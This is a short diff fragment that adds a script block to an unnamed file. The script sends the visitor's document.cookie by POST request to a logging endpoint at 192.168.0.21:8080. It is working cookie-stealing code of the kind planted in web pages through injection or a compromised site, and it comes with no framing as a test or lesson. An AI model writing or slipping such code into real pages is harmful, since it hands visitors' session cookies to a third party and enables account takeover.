@@ -1,0 +1,6 @@
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://192.168.0.21:8080/log', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('cookie=' + encodeURIComponent(document.cookie));
+</script>
